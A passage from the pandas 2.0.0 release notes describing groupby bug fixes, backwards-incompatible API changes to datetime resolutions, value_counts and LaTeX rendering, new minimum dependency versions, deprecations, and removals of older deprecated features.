* 7, \"value\": 625})\n    In [2]: df.groupby(\"key\")[\"value\"].cumprod()[5]\n    Out[2]: 5.960464477539062e+16\n\nWe return incorrect results with the 6th value.\n\n*New Behavior*\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"key\": [\"b\"] * 7, \"value\": 625})\n    df.groupby(\"key\")[\"value\"].cumprod()\n\nWe overflow with the 7th value, but the 6th value is still correct.\n\n.. _whatsnew_200.notable_bug_fixes.groupby_nth_filter:\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now behave as filtrations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :meth:`.DataFrameGroupBy.nth` and\n:meth:`.SeriesGroupBy.nth` acted as if they were aggregations. However, for most\ninputs ``n``, they may return either zero or multiple rows per group. This means\nthat they are filtrations, similar to e.g. :meth:`.DataFrameGroupBy.head`. pandas\nnow treats them as filtrations (:issue:`13666`).\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"a\": [1, 1, 2, 1, 2], \"b\": [np.nan, 2.0, 3.0, 4.0, 5.0]})\n    gb = df.groupby(\"a\")\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: gb.nth(n=1)\n    Out[5]:\n       A    B\n    1  1  2.0\n    4  2  5.0\n\n*New Behavior*\n\n.. ipython:: python\n\n    gb.nth(n=1)\n\nIn particular, the index of the result is derived from the input by selecting\nthe appropriate rows. Also, when ``n`` is larger than the group, no rows instead of\n``NaN`` is returned.\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: gb.nth(n=3, dropna=\"any\")\n    Out[5]:\n        B\n    A\n    1 NaN\n    2 NaN\n\n*New Behavior*\n\n.. ipython:: python\n\n    gb.nth(n=3, dropna=\"any\")\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_200.api_breaking.unsupported_datetimelike_dtype_arg:\n\nConstruction with datetime64 or timedelta64 dtype with unsupported resolution\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn past versions, when constructing a :class:`Series` or :class:`DataFrame` and\npassing a \"datetime64\" or \"timedelta64\" dtype with unsupported resolution\n(i.e. anything other than \"ns\"), pandas would silently replace the given dtype\nwith its nanosecond analogue:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [5]: pd.Series([\"2016-01-01\"], dtype=\"datetime64[s]\")\n   Out[5]:\n   0   2016-01-01\n   dtype: datetime64[ns]\n\n   In [6] pd.Series([\"2016-01-01\"], dtype=\"datetime64[D]\")\n   Out[6]:\n   0   2016-01-01\n   dtype: datetime64[ns]\n\nIn pandas 2.0 we support resolutions \"s\", \"ms\", \"us\", and \"ns\". When passing\na supported dtype (e.g. \"datetime64[s]\"), the result now has exactly\nthe requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   pd.Series([\"2016-01-01\"], dtype=\"datetime64[s]\")\n\nWith an un-supported dtype, pandas now raises instead of silently swapping in\na supported dtype:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   pd.Series([\"2016-01-01\"], dtype=\"datetime64[D]\")\n\n.. _whatsnew_200.api_breaking.value_counts:\n\nValue counts sets the resulting name to ``count``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn past versions, when running :meth:`Series.value_counts`, the result would inherit\nthe original object's name, and the result index would be nameless. This would cause\nconfusion when resetting the index, and the column names would not correspond with the\ncolumn values.\nNow, the result name will be ``'count'`` (or ``'proportion'`` if ``normalize=True`` was passed),\nand the index will be named after the original object (:issue:`49497`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [8]: pd.Series(['quetzal', 'quetzal', 'elk'], name='animal').value_counts()\n\n    Out[2]:\n    quetzal    2\n    elk        1\n    Name: animal, dtype: int64\n\n*New behavior*:\n\n.. ipython:: python\n\n    pd.Series(['quetzal', 'quetzal', 'elk'], name='animal').value_counts()\n\nLikewise for other ``value_counts`` methods (for example, :meth:`DataFrame.value_counts`).\n\n.. _whatsnew_200.api_breaking.astype_to_unsupported_datetimelike:\n\nDisallow astype conversion to non-supported datetime64/timedelta64 dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn previous versions, converting a :class:`Series` or :class:`DataFrame`\nfrom ``datetime64[ns]`` to a different ``datetime64[X]`` dtype would return\nwith ``datetime64[ns]`` dtype instead of the requested dtype. In pandas 2.0,\nsupport is added for \"datetime64[s]\", \"datetime64[ms]\", and \"datetime64[us]\" dtypes,\nso converting to those dtypes gives exactly the requested dtype:\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   idx = pd.date_range(\"2016-01-01\", periods=3)\n   ser = pd.Series(idx)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [4]: ser.astype(\"datetime64[s]\")\n   Out[4]:\n   0   2016-01-01\n   1   2016-01-02\n   2   2016-01-03\n   dtype: datetime64[ns]\n\nWith the new behavior, we get exactly the requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   ser.astype(\"datetime64[s]\")\n\nFor non-supported resolutions e.g. \"datetime64[D]\", we raise instead of silently\nignoring the requested dtype:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   ser.astype(\"datetime64[D]\")\n\nFor conversion from ``timedelta64[ns]`` dtypes, the old behavior converted\nto a floating point format.\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   idx = pd.timedelta_range(\"1 Day\", periods=3)\n   ser = pd.Series(idx)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [7]: ser.astype(\"timedelta64[s]\")\n   Out[7]:\n   0     86400.0\n   1    172800.0\n   2    259200.0\n   dtype: float64\n\n   In [8]: ser.astype(\"timedelta64[D]\")\n   Out[8]:\n   0    1.0\n   1    2.0\n   2    3.0\n   dtype: float64\n\nThe new behavior, as for datetime64, either gives exactly the requested dtype or raises:\n\n*New behavior*:\n\n.. ipython:: python\n   :okexcept:\n\n   ser.astype(\"timedelta64[s]\")\n   ser.astype(\"timedelta64[D]\")\n\n.. _whatsnew_200.api_breaking.default_to_stdlib_tzinfos:\n\nUTC and fixed-offset timezones default to standard-library tzinfo objects\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIn previous versions, the default ``tzinfo`` object used to represent UTC\nwas ``pytz.UTC``. In pandas 2.0, we default to ``datetime.timezone.utc`` instead.\nSimilarly, for timezones represent fixed UTC offsets, we use ``datetime.timezone``\nobjects instead of ``pytz.FixedOffset`` objects. See (:issue:`34916`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [2]: ts = pd.Timestamp(\"2016-01-01\", tz=\"UTC\")\n   In [3]: type(ts.tzinfo)\n   Out[3]: pytz.UTC\n\n   In [4]: ts2 = pd.Timestamp(\"2016-01-01 04:05:06-07:00\")\n   In [3]: type(ts2.tzinfo)\n   Out[5]: pytz._FixedOffset\n\n*New behavior*:\n\n.. ipython:: python\n\n   ts = pd.Timestamp(\"2016-01-01\", tz=\"UTC\")\n   type(ts.tzinfo)\n\n   ts2 = pd.Timestamp(\"2016-01-01 04:05:06-07:00\")\n   type(ts2.tzinfo)\n\nFor timezones that are neither UTC nor fixed offsets, e.g. \"US/Pacific\", we\ncontinue to default to ``pytz`` objects.\n\n.. _whatsnew_200.api_breaking.zero_len_indexes:\n\nEmpty DataFrames/Series will now default to have a ``RangeIndex``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBefore, constructing an empty (where ``data`` is ``None`` or an empty list-like argument) :class:`Series` or :class:`DataFrame` without\nspecifying the axes (``index=None``, ``columns=None``) would return the axes as empty :class:`Index` with object dtype.\n\nNow, the axes return an empty :class:`RangeIndex` (:issue:`49572`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [8]: pd.Series().index\n   Out[8]:\n   Index([], dtype='object')\n\n   In [9] pd.DataFrame().axes\n   Out[9]:\n   [Index([], dtype='object'), Index([], dtype='object')]\n\n*New behavior*:\n\n.. ipython:: python\n\n   pd.Series().index\n   pd.DataFrame().axes\n\n.. _whatsnew_200.api_breaking.to_latex:\n\nDataFrame to LaTeX has a new render engine\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe existing :meth:`DataFrame.to_latex` has been restructured to utilise the\nextended implementation previously available under :meth:`.Styler.to_latex`.\nThe arguments signature is similar, albeit ``col_space`` has been removed since\nit is ignored by LaTeX engines. This render engine also requires ``jinja2`` as a\ndependency which needs to be installed, since rendering is based upon jinja2 templates.\n\nThe pandas latex options below are no longer used and have been removed. The generic\nmax rows and columns arguments remain but for this functionality should be replaced\nby the Styler equivalents.\nThe alternative options giving similar functionality are indicated below:\n\n- ``display.latex.escape``: replaced with ``styler.format.escape``,\n- ``display.latex.longtable``: replaced with ``styler.latex.environment``,\n- ``display.latex.multicolumn``, ``display.latex.multicolumn_format`` and\n  ``display.latex.multirow``: replaced with ``styler.sparse.rows``,\n  ``styler.sparse.columns``, ``styler.latex.multirow_align`` and\n  ``styler.latex.multicol_align``,\n- ``display.latex.repr``: replaced with ``styler.render.repr``,\n- ``display.max_rows`` and ``display.max_columns``: replace with\n  ``styler.render.max_rows``, ``styler.render.max_columns`` and\n  ``styler.render.max_elements``.\n\nNote that due to this change some defaults have also changed:\n\n- ``multirow`` now defaults to *True*.\n- ``multirow_align`` defaults to *\"r\"* instead of *\"l\"*.\n- ``multicol_align`` defaults to *\"r\"* instead of *\"l\"*.\n- ``escape`` now defaults to *False*.\n\nNote that the behaviour of ``_repr_latex_`` is also changed. Previously\nsetting ``display.latex.repr`` would generate LaTeX only when using nbconvert for a\nJupyterNotebook, and not when the user is running the notebook. Now the\n``styler.render.repr`` option allows control of the specific output\nwithin JupyterNotebooks for operations (not just on nbconvert). See :issue:`39911`.\n\n.. _whatsnew_200.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-------------------+-----------------+----------+---------+\n| Package           | Minimum Version | Required | Changed |\n+===================+=================+==========+=========+\n| mypy (dev)        | 1.0             |          |    X    |\n+-------------------+-----------------+----------+---------+\n| pytest (dev)      | 7.0.0           |          |    X    |\n+-------------------+-----------------+----------+---------+\n| pytest-xdist (dev)| 2.2.0           |          |    X    |\n+-------------------+-----------------+----------+---------+\n| hypothesis (dev)  | 6.34.2          |          |    X    |\n+-------------------+-----------------+----------+---------+\n| python-dateutil   | 2.8.2           |    X     |    X    |\n+-------------------+-----------------+----------+---------+\n| tzdata            | 2022.1          |    X     |    X    |\n+-------------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| pyarrow         | 7.0.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 3.6.1           |    X    |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.6.3           |    X    |\n+-----------------+-----------------+---------+\n| xarray          | 0.21.0          |    X    |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nDatetimes are now parsed with a consistent format\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn the past, :func:`to_datetime` guessed the format for each element independently. This was appropriate for some cases where elements had mixed date formats - however, it would regularly cause problems when users expected a consistent format but the function would switch formats between elements. As of version 2.0.0, parsing will use a consistent format, determined by the first non-NA value (unless the user specifies a format, in which case that is used).\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n   In [1]: ser = pd.Series(['13-01-2000', '12-01-2000'])\n   In [2]: pd.to_datetime(ser)\n   Out[2]:\n   0   2000-01-13\n   1   2000-12-01\n   dtype: datetime64[ns]\n\n*New behavior*:\n\n.. ipython:: python\n    :okwarning:\n\n     ser = pd.Series(['13-01-2000', '12-01-2000'])\n     pd.to_datetime(ser)\n\nNote that this affects :func:`read_csv` as well.\n\nIf you still need to parse dates with inconsistent formats, you can use\n``format='mixed'`` (possibly alongside ``dayfirst``) ::\n\n     ser = pd.Series(['13-01-2000', '12 January 2000'])\n     pd.to_datetime(ser, format='mixed', dayfirst=True)\n\nor, if your formats are all ISO8601 (but possibly not identically-formatted) ::\n\n     ser = pd.Series(['2020-01-01', '2020-01-01 03:00'])\n     pd.to_datetime(ser, format='ISO8601')\n\n.. _whatsnew_200.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- The ``freq``, ``tz``, ``nanosecond``, and ``unit`` keywords in the :class:`Timestamp` constructor are now keyword-only (:issue:`45307`, :issue:`32526`)\n- Passing ``nanoseconds`` greater than 999 or less than 0 in :class:`Timestamp` now raises a ``ValueError`` (:issue:`48538`, :issue:`48255`)\n- :func:`read_csv`: specifying an incorrect number of columns with ``index_col`` of now raises ``ParserError`` instead of ``IndexError`` when using the c parser.\n- Default value of ``dtype`` in :func:`get_dummies` is changed to ``bool`` from ``uint8`` (:issue:`45848`)\n- :meth:`DataFrame.astype`, :meth:`Series.astype`, and :meth:`DatetimeIndex.astype` casting datetime64 data to any of \"datetime64[s]\", \"datetime64[ms]\", \"datetime64[us]\" will return an object with the given resolution instead of coercing back to \"datetime64[ns]\" (:issue:`48928`)\n- :meth:`DataFrame.astype`, :meth:`Series.astype`, and :meth:`DatetimeIndex.astype` casting timedelta64 data to any of \"timedelta64[s]\", \"timedelta64[ms]\", \"timedelta64[us]\" will return an object with the given resolution instead of coercing to \"float64\" dtype (:issue:`48963`)\n- :meth:`DatetimeIndex.astype`, :meth:`TimedeltaIndex.astype`, :meth:`PeriodIndex.astype` :meth:`Series.astype`, :meth:`DataFrame.astype` with ``datetime64``, ``timedelta64`` or :class:`PeriodDtype` dtypes no longer allow converting to integer dtypes other than \"int64\", do ``obj.astype('int64', copy=False).astype(dtype)`` instead (:issue:`49715`)\n- :meth:`Index.astype` now allows casting from ``float64`` dtype to datetime-like dtypes, matching :class:`Series` behavior (:issue:`49660`)\n- Passing data with dtype of \"timedelta64[s]\", \"timedelta64[ms]\", or \"timedelta64[us]\" to :class:`TimedeltaIndex`, :class:`Series`, or :class:`DataFrame` constructors will now retain that dtype instead of casting to \"timedelta64[ns]\"; timedelta64 data with lower resolution will be cast to the lowest supported resolution \"timedelta64[s]\" (:issue:`49014`)\n- Passing ``dtype`` of \"timedelta64[s]\", \"timedelta64[ms]\", or \"timedelta64[us]\" to :class:`TimedeltaIndex`, :class:`Series`, or :class:`DataFrame` constructors will now retain that dtype instead of casting to \"timedelta64[ns]\"; passing a dtype with lower resolution for :class:`Series` or :class:`DataFrame` will be cast to the lowest supported resolution \"timedelta64[s]\" (:issue:`49014`)\n- Passing a ``np.datetime64`` object with non-nanosecond resolution to :class:`Timestamp` will retain the input resolution if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`49008`)\n- Passing ``datetime64`` values with resolution other than nanosecond to :func:`to_datetime` will retain the input resolution if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`50369`)\n- Passing integer values and a non-nanosecond datetime64 dtype (e.g. \"datetime64[s]\") :class:`DataFrame`, :class:`Series`, or :class:`Index` will treat the values as multiples of the dtype's unit, matching the behavior of e.g. ``Series(np.array(values, dtype=\"M8[s]\"))`` (:issue:`51092`)\n- Passing a string in ISO-8601 format to :class:`Timestamp` will retain the resolution of the parsed input if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`49737`)\n- The ``other`` argument in :meth:`DataFrame.mask` and :meth:`Series.mask` now defaults to ``no_default`` instead of ``np.nan`` consistent with :meth:`DataFrame.where` and :meth:`Series.where`. Entries will be filled with the corresponding NULL value (``np.nan`` for numpy dtypes, ``pd.NA`` for extension dtypes). (:issue:`49111`)\n- Changed behavior of :meth:`Series.quantile` and :meth:`DataFrame.quantile` with :class:`SparseDtype` to retain sparse dtype (:issue:`49583`)\n- When creating a :class:`Series` with a object-dtype :class:`Index` of datetime objects, pandas no longer silently converts the index to a :class:`DatetimeIndex` (:issue:`39307`, :issue:`23598`)\n- :func:`pandas.testing.assert_index_equal` with parameter ``exact=\"equiv\"`` now considers two indexes equal when both are either a :class:`RangeIndex` or :class:`Index` with an ``int64`` dtype. Previously it meant either a :class:`RangeIndex` or a :class:`Int64Index` (:issue:`51098`)\n- :meth:`Series.unique` with dtype \"timedelta64[ns]\" or \"datetime64[ns]\" now returns :class:`TimedeltaArray` or :class:`DatetimeArray` instead of ``numpy.ndarray`` (:issue:`49176`)\n- :func:`to_datetime` and :class:`DatetimeIndex` now allow sequences containing both ``datetime`` objects and numeric entries, matching :class:`Series` behavior (:issue:`49037`, :issue:`50453`)\n- :func:`pandas.api.types.is_string_dtype` now only returns ``True`` for array-likes with ``dtype=object`` when the elements are inferred to be strings (:issue:`15585`)\n- Passing a sequence containing ``datetime`` objects and ``date`` objects to :class:`Series` constructor will return with ``object`` dtype instead of ``datetime64[ns]`` dtype, consistent with :class:`Index` behavior (:issue:`49341`)\n- Passing strings that cannot be parsed as datetimes to :class:`Series` or :class:`DataFrame` with ``dtype=\"datetime64[ns]\"`` will raise instead of silently ignoring the keyword and returning ``object`` dtype (:issue:`24435`)\n- Passing a sequence containing a type that cannot be converted to :class:`Timedelta` to :func:`to_timedelta` or to the :class:`Series` or :class:`DataFrame` constructor with ``dtype=\"timedelta64[ns]\"`` or to :class:`TimedeltaIndex` now raises ``TypeError`` instead of ``ValueError`` (:issue:`49525`)\n- Changed behavior of :class:`Index` constructor with sequence containing at least one ``NaT`` and everything else either ``None`` or ``NaN`` to infer ``datetime64[ns]`` dtype instead of ``object``, matching :class:`Series` behavior (:issue:`49340`)\n- :func:`read_stata` with parameter ``index_col`` set to ``None`` (the default) will now set the index on the returned :class:`DataFrame` to a :class:`RangeIndex` instead of a :class:`Int64Index` (:issue:`49745`)\n- Changed behavior of :class:`Index`, :class:`Series`, and :class:`DataFrame` arithmetic methods when working with object-dtypes, the results no longer do type inference on the result of the array operations, use ``result.infer_objects(copy=False)`` to do type inference on the result (:issue:`49999`, :issue:`49714`)\n- Changed behavior of :class:`Index` constructor with an object-dtype ``numpy.ndarray`` containing all-``bool`` values or all-complex values, this will now retain object dtype, consistent with the :class:`Series` behavior (:issue:`49594`)\n- Changed behavior of :meth:`Series.astype` from object-dtype containing ``bytes`` objects to string dtypes; this now does ``val.decode()`` on bytes objects instead of ``str(val)``, matching :meth:`Index.astype` behavior (:issue:`45326`)\n- Added ``\"None\"`` to default ``na_values`` in :func:`read_csv` (:issue:`50286`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors when given an integer dtype and floating-point data that is not round numbers, this now raises ``ValueError`` instead of silently retaining the float dtype; do ``Series(data)`` or ``DataFrame(data)`` to get the old behavior, and ``Series(data).astype(dtype)`` or ``DataFrame(data).astype(dtype)`` to get the specified dtype (:issue:`49599`)\n- Changed behavior of :meth:`DataFrame.shift` with ``axis=1``, an integer ``fill_value``, and homogeneous datetime-like dtype, this now fills new columns with integer dtypes instead of casting to datetimelike (:issue:`49842`)\n- Files are now closed when encountering an exception in :func:`read_json` (:issue:`49921`)\n- Changed behavior of :func:`read_csv`, :func:`read_json` & :func:`read_fwf`, where the index will now always be a :class:`RangeIndex`, when no index is specified. Previously the index would be a :class:`Index` with dtype ``object`` if the new DataFrame/Series has length 0 (:issue:`49572`)\n- :meth:`DataFrame.values`, :meth:`DataFrame.to_numpy`, :meth:`DataFrame.xs`, :meth:`DataFrame.reindex`, :meth:`DataFrame.fillna`, and :meth:`DataFrame.replace` no longer silently consolidate the underlying arrays; do ``df = df.copy()`` to ensure consolidation (:issue:`49356`)\n- Creating a new DataFrame using a full slice on both axes with :attr:`~DataFrame.loc`\n  or :attr:`~DataFrame.iloc` (thus, ``df.loc[:, :]`` or ``df.iloc[:, :]``) now returns a\n  new DataFrame (shallow copy) instead of the original DataFrame, consistent with other\n  methods to get a full slice (for example ``df.loc[:]`` or ``df[:]``) (:issue:`49469`)\n- The :class:`Series` and :class:`DataFrame` constructors will now return a shallow copy\n  (i.e. share data, but not attributes) when passed a Series and DataFrame,\n  respectively, and with the default of ``copy=False`` (and if no other keyword triggers\n  a copy). Previously, the new Series or DataFrame would share the index attribute (e.g.\n  ``df.index = ...`` would also update the index of the parent or child) (:issue:`49523`)\n- Disallow computing ``cumprod`` for :class:`Timedelta` object; previously this returned incorrect values (:issue:`50246`)\n- :class:`DataFrame` objects read from a :class:`HDFStore` file without an index now have a :class:`RangeIndex` instead of an ``int64`` index (:issue:`51076`)\n- Instantiating an :class:`Index` with an numeric numpy dtype with data containing :class:`NA` and/or :class:`NaT` now raises a ``ValueError``. Previously a ``TypeError`` was raised (:issue:`51050`)\n- Loading a JSON file with duplicate columns using ``read_json(orient='split')`` renames columns to avoid duplicates, as :func:`read_csv` and the other readers do (:issue:`50370`)\n- The levels of the index of the :class:`Series` returned from ``Series.sparse.from_coo`` now always have dtype ``int32``. Previously they had dtype ``int64`` (:issue:`50926`)\n- :func:`to_datetime` with ``unit`` of either \"Y\" or \"M\" will now raise if a sequence contains a non-round ``float`` value, matching the ``Timestamp`` behavior (:issue:`50301`)\n- The methods :meth:`Series.round`, :meth:`DataFrame.__invert__`, :meth:`Series.__invert__`, :meth:`DataFrame.swapaxes`, :meth:`DataFrame.first`, :meth:`DataFrame.last`, :meth:`Series.first`, :meth:`Series.last` and :meth:`DataFrame.align` will now always return new objects (:issue:`51032`)\n- :class:`DataFrame` and :class:`DataFrameGroupBy` aggregations (e.g. \"sum\") with object-dtype columns no longer infer non-object dtypes for their results, explicitly call ``result.infer_objects(copy=False)`` on the result to obtain the old behavior (:issue:`51205`, :issue:`49603`)\n- Division by zero with :class:`ArrowDtype` dtypes returns ``-inf``, ``nan``, or ``inf`` depending on the numerator, instead of raising (:issue:`51541`)\n- Added :func:`pandas.api.types.is_any_real_numeric_dtype` to check for real numeric dtypes (:issue:`51152`)\n- :meth:`~arrays.ArrowExtensionArray.value_counts` now returns data with :class:`ArrowDtype` with ``pyarrow.int64`` type instead of ``\"Int64\"`` type (:issue:`51462`)\n- :func:`factorize` and :func:`unique` preserve the original dtype when passed numpy timedelta64 or datetime64 with non-nanosecond resolution (:issue:`48670`)\n\n.. note::\n\n    A current PDEP proposes the deprecation and removal of the keywords ``inplace`` and ``copy``\n    for all but a small subset of methods from the pandas API. The current discussion takes place\n    at `here <https://github.com/pandas-dev/pandas/pull/51466>`_. The keywords won't be necessary\n    anymore in the context of Copy-on-Write. If this proposal is accepted, both\n    keywords would be deprecated in the next release of pandas and removed in pandas 3.0.\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n- Deprecated parsing datetime strings with system-local timezone to ``tzlocal``, pass a ``tz`` keyword or explicitly call ``tz_localize`` instead (:issue:`50791`)\n- Deprecated argument ``infer_datetime_format`` in :func:`to_datetime` and :func:`read_csv`, as a strict version of it is now the default (:issue:`48621`)\n- Deprecated behavior of :func:`to_datetime` with ``unit`` when parsing strings, in a future version these will be parsed as datetimes (matching unit-less behavior) instead of cast to floats. To retain the old behavior, cast strings to numeric types before calling :func:`to_datetime` (:issue:`50735`)\n- Deprecated :func:`pandas.io.sql.execute` (:issue:`50185`)\n- :meth:`Index.is_boolean` has been deprecated. Use :func:`pandas.api.types.is_bool_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_integer` has been deprecated. Use :func:`pandas.api.types.is_integer_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_floating` has been deprecated. Use :func:`pandas.api.types.is_float_dtype` instead (:issue:`50042`)\n- :meth:`Index.holds_integer` has been deprecated. Use :func:`pandas.api.types.infer_dtype` instead (:issue:`50243`)\n- :meth:`Index.is_numeric` has been deprecated. Use :func:`pandas.api.types.is_any_real_numeric_dtype` instead (:issue:`50042`,:issue:`51152`)\n- :meth:`Index.is_categorical` has been deprecated. Use :func:`pandas.api.types.is_categorical_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_object` has been deprecated. Use :func:`pandas.api.types.is_object_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_interval` has been deprecated. Use :func:`pandas.api.types.is_interval_dtype` instead (:issue:`50042`)\n- Deprecated argument ``date_parser`` in :func:`read_csv`, :func:`read_table`, :func:`read_fwf`, and :func:`read_excel` in favour of ``date_format`` (:issue:`50601`)\n- Deprecated ``all`` and ``any`` reductions with ``datetime64`` and :class:`DatetimeTZDtype` dtypes, use e.g. ``(obj != pd.Timestamp(0), tz=obj.tz).all()`` instead (:issue:`34479`)\n- Deprecated unused arguments ``*args`` and ``**kwargs`` in :class:`Resampler` (:issue:`50977`)\n- Deprecated calling ``float`` or ``int`` on a single element :class:`Series` to return a ``float`` or ``int`` respectively. Extract the element before calling ``float`` or ``int`` instead (:issue:`51101`)\n- Deprecated :meth:`Grouper.groups`, use :meth:`Groupby.groups` instead (:issue:`51182`)\n- Deprecated :meth:`Grouper.grouper`, use :meth:`Groupby.grouper` instead (:issue:`51182`)\n- Deprecated :meth:`Grouper.obj`, use :meth:`Groupby.obj` instead (:issue:`51206`)\n- Deprecated :meth:`Grouper.indexer`, use :meth:`Resampler.indexer` instead (:issue:`51206`)\n- Deprecated :meth:`Grouper.ax`, use :meth:`Resampler.ax` instead (:issue:`51206`)\n- Deprecated keyword ``use_nullable_dtypes`` in :func:`read_parquet`, use ``dtype_backend`` instead (:issue:`51853`)\n- Deprecated :meth:`Series.pad` in favor of :meth:`Series.ffill` (:issue:`33396`)\n- Deprecated :meth:`Series.backfill` in favor of :meth:`Series.bfill` (:issue:`33396`)\n- Deprecated :meth:`DataFrame.pad` in favor of :meth:`DataFrame.ffill` (:issue:`33396`)\n- Deprecated :meth:`DataFrame.backfill` in favor of :meth:`DataFrame.bfill` (:issue:`33396`)\n- Deprecated :meth:`~pandas.io.stata.StataReader.close`. Use :class:`~pandas.io.stata.StataReader` as a context manager instead (:issue:`49228`)\n- Deprecated producing a scalar when iterating over a :class:`.DataFrameGroupBy` or a :class:`.SeriesGroupBy` that has been grouped by a ``level`` parameter that is a list of length 1; a tuple of length one will be returned instead (:issue:`51583`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n- Removed :class:`Int64Index`, :class:`UInt64Index` and :class:`Float64Index`. See also :ref:`here <whatsnew_200.enhancements.index_can_hold_numpy_numeric_dtypes>` for more information (:issue:`42717`)\n- Removed deprecated :attr:`Timestamp.freq`, :attr:`Timestamp.freqstr` and argument ``freq`` from the :class:`Timestamp` constructor and :meth:`Timestamp.fromordinal` (:issue:`14146`)\n- Removed deprecated :class:`CategoricalBlock`, :meth:`Block.is_categorical`, require datetime64 and timedelta64 values to be wrapped in :class:`DatetimeArray` or :class:`TimedeltaArray` before passing to :meth:`Block.make_block_same_class`, require ``DatetimeTZBlock.values`` to have the correct ndim when passing to the :class:`BlockManager` constructor, and removed the \"fastpath\" keyword from the :class:`SingleBlockManager` constructor (:issue:`40226`, :issue:`40571`)\n- Removed deprecated global option ``use_inf_as_null`` in favor of ``use_inf_as_na`` (:issue:`17126`)\n- Removed deprecated module ``pandas.core.index`` (:issue:`30193`)\n- Removed deprecated alias ``pandas.core.tools.datetimes.to_time``, import the function directly from ``pandas.core.tools.times`` instead (:issue:`34145`)\n- Removed deprecated alias ``pandas.io.json.json_normalize``, import the function directly from ``pandas.json_normalize`` instead (:issue:`27615`)\n- Removed deprecated :meth:`Categorical.to_dense`, use ``np.asarray(cat)`` instead (:issue:`32639`)\n- Removed deprecated :meth:`Categorical.take_nd` (:issue:`27745`)\n- Removed deprecated :meth:`Categorical.mode`, use ``Series(cat).mode()`` instead (:issue:`45033`)\n- Removed deprecated :meth:`Categorical.is_dtype_equal` and :meth:`CategoricalIndex.is_dtype_equal` (:issue:`37545`)\n- Removed deprecated :meth:`CategoricalIndex.take_nd` (:issue:`30702`)\n- Removed deprecated :meth:`Index.is_type_compatible` (:issue:`42113`)\n- Removed deprecated :meth:`Index.is_mixed`, check ``index.inferred_type`` directly instead (:issue:`32922`)\n- Removed deprecated :func:`pandas.api.types.is_categorical`; use :func:`pandas.api.types.is_categorical_dtype` instead  (:issue:`33385`)\n- Removed deprecated :meth:`Index.asi8` (:issue:`37877`)\n- Enforced deprecation changing behavior when passing ``datetime64[ns]`` dtype data and timezone-aware dtype to :class:`Series`, interpreting the values as wall-times instead of UTC times, matching :class:`DatetimeIndex` behavior (:issue:`41662`)\n- Enforced deprecation changing behavior when applying a numpy ufunc on multiple non-aligned (on the index or columns) :class:`DataFrame` that will now align the inputs first (:issue:`39239`)\n- Removed deprecated 